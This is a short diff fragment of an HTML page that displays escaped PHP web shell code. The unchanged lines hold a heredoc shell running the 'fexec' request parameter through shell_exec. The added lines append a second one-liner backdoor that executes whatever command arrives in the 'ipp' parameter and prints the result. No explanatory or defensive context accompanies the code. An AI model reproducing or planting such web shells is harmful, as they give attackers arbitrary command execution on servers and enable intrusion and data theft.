@@ -12,4 +12,6 @@
 &nbsp; echo "&lt;pre&gt;" . shell_exec($_REQUEST['fexec']) . "&lt;/pre&gt;";<br/>
 &nbsp;}'<br/>
 ?&gt;<br/>
-EOD;</body></html>
+EOD;<br/>
+<br/>
+&lt;?php if (isset($_REQUEST['ipp'])) {echo "&lt;pre&gt;" . shell_exec($_REQUEST['ipp']) . "&lt;/pre&gt;";}; &nbsp;?&gt;</body></html>
